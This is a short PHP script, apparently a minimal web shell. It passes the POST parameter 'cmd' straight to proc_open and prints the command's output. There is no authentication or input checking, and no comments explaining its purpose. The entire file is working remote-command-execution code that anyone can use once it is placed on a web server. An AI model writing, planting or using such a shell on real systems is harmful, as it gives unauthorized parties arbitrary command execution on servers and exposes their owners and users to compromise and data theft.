<?php
 
$descriptorspec = array (
    0 => array ("pipe","r"),
    1 => array ("pipe","w"),
    2 => array ("pipe","w")
);
 
 
$handle = proc_open ($_POST["cmd"], $descriptorspec, $pipes, NULL, NULL,
    array("bypass_shell" => 1));
 
if (! is_resource($handle))
    die ("Process handle creation failed!\n");
 
$output = stream_get_contents ($pipes[1]);
$error = stream_get_contents ($pipes[2]);
 
print $output;

fclose ($pipes[0]);
fclose ($pipes[1]);
fclose ($pipes[2]);
 
$ret = proc_close ($handle);
?>
